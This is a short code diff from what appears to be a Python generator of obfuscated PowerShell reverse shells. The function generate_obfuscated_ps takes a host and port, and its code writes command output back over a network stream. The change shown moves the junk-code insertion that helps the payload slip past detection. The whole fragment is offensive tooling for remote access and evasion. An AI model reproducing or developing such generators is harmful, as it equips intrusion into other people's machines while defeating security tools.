@@ -82,9 +82,8 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         f"    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n" +
         f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n" +
         f"    ${{{var['stream']}}}.Flush()\n" +
-        "    " + junk_code() +
-        "}\n" +
-        junk_code()
+        "}\n"
+        + junk_code()
     )
 
 
